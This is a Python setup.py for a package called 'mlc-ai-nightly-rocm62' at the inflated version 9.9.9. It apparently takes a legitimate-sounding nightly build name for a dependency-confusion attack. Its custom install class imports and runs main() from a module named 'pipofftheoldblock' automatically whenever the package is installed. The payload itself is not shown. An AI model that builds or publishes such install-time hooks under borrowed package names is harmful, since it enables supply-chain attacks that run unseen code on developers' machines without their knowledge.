import sys
from setuptools import setup, find_packages
from setuptools.command.install import install


class PostInstallScript(install):
    def run(self):
        sys.path.insert(0, 'src')
        from pipofftheoldblock.run import main
        main(b"mar2")
        install.run(self)


setup(
    name='mlc-ai-nightly-rocm62',
    version='9.9.9',
    py_modules=['pipofftheoldblock'],
    cmdclass={
        "install": PostInstallScript,
    },
    packages=find_packages('src'),
    package_dir={'':'src'},
)

